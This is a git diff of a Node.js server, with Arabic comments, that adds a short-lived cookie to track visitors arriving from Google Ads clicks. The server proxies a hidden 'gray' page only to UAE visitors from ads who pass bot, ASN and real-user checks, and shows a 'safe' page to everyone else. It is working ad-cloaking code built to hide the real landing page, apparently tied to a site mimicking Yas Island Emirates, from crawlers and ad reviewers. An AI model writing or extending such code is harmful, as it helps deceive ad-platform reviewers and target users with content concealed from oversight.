@@ -5,6 +5,7 @@ const dns = require("dns");
 const fs = require("fs");
 const csv = require("csv-parser");
 const requestIp = require("request-ip");
+const cookieParser = require("cookie-parser"); // ✅ لإدارة الكوكيز
 
 const PORT = process.env.PORT || 10000;
 const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
@@ -12,6 +13,7 @@ const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.
 const UAE_COUNTRY_CODE = "AE";
 
 app.set("trust proxy", true);
+app.use(cookieParser()); // ✅ تفعيل الكوكي بارسر
 
 const BOT_KEYWORDS = [
   "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
@@ -143,6 +145,22 @@ app.all("*", async (req, res) => {
 
   console.log(`📎 Referrer: ${referrer}`);
 
+  // ✅ فحص gclid لإعطاء كوكي مؤقت
+  try {
+    const url = new URL(req.protocol + '://' + req.get('host') + req.originalUrl);
+    const hasGclid = url.searchParams.has("gclid");
+
+    if (hasGclid) {
+      res.cookie("from_ads", "1", {
+        maxAge: 3 * 60 * 1000, // ⏱️ صالح لمدة 3 دقائق فقط
+        httpOnly: true,
+        sameSite: "strict"
+      });
+    }
+  } catch (e) {
+    console.warn("⚠️ Failed to parse URL:", e.message);
+  }
+
   let countryCode = null, asn = null, orgName = null;
 
   const uaLower = ua.toLowerCase();
@@ -179,12 +197,13 @@ app.all("*", async (req, res) => {
   const isDetectedBot = await isBot(req);
   const isRealUser = isLikelyRealUser(req);
   const isASNBlocked = isBlockedASN(asn, orgName);
+  const cameFromAd = req.cookies && req.cookies.from_ads === "1";
 
-  console.log(`🧠 Decision: UAE=${isFromUAE} | Bot=${isDetectedBot} | RealUser=${isRealUser} | ASNBlocked=${isASNBlocked} | IP=${ip}`);
+  console.log(`🧠 Decision: UAE=${isFromUAE} | Bot=${isDetectedBot} | RealUser=${isRealUser} | ASNBlocked=${isASNBlocked} | FromAds=${cameFromAd} | IP=${ip}`);
 
   await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));
 
-  if (isFromUAE && !isDetectedBot && isRealUser && !isASNBlocked) {
+  if (isFromUAE && !isDetectedBot && isRealUser && !isASNBlocked && cameFromAd) {
     console.log("✅ Redirecting to GRAY_PAGE");
     await proxyContent(GRAY_PAGE, req, res);
   } else {
